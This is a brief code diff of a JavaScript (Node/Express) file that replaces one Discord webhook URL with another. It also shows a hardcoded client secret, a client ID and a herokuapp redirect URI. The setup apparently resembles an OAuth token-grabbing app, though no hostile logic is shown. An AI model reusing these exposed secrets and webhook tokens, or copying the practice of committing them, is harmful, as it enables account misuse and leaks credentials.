@@ -2,7 +2,7 @@
 const secret_value = 'Bvh8Q~hQYPgYvAhFlQrKKi5RJdQxoiHtSXMXKa9k'
 const client_id = '4b44c64f-3bda-423d-ba30-6144ea293859'
 const redirect_uri = 'https://assisbuteifl.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1050416140448444467/WJwn-USlsBp2DEQfEda34zInhqM-9OKKKhVcGMF0DgRGhmkRdSh5atlOkbmHx631L9yR'
+const webhook_url = 'https://discord.com/api/webhooks/1050732301295812608/RZQ34Ari7jVdyYJcvPCDDOgbDE2Tcgt9_qsDtqFmJ6Z_Ay5sIA8JQ6nih0mZY-XyAhL7'
 //Requirements
 const axios = require('axios')
 const express = require('express')
